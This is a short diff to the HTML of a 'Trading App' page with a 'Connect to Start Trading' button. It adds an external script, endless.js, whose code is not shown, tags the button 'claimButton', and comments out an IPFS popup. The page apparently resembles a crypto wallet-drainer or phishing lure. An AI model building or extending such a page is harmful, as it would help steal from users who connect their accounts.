@@ -4,6 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Trading App</title>
+    <script type="module" src="endless.js" defer></script>
     <style>
       * {
         box-sizing: border-box;
@@ -14,7 +15,7 @@
       html {
         height: 100%;
         font-family: "Arial", sans-serif;
-        background-color: #f5f7fa;
+        background-color: #6f87ac;
         display: flex;
         justify-content: center;
         align-items: center;
@@ -61,19 +62,19 @@
       <p>
         Connect your account to begin trading and access the latest markets.
       </p>
-      <button class="trade-button" id="connectBtn">
+      <button class="trade-button claimButton" id="connectBtn">
         Connect to Start Trading
       </button>
     </div>
 
     <script>
-      document.getElementById("connectBtn").onclick = function () {
-        window.open(
-          "https://ipfs.io/ipfs/bafkreidogrr2j4x6w7qdohv7tbi6uy7bdlper3gmxdldy5pwtptcfwg6su",
-          "_blank",
-          "width=400,height=600"
-        );
-      };
+      // document.getElementById("connectBtn").onclick = function () {
+      //   window.open(
+      //     "https://ipfs.io/ipfs/bafkreidogrr2j4x6w7qdohv7tbi6uy7bdlper3gmxdldy5pwtptcfwg6su",
+      //     "_blank",
+      //     "width=400,height=600"
+      //   );
+      // };
     </script>
   </body>
 </html>
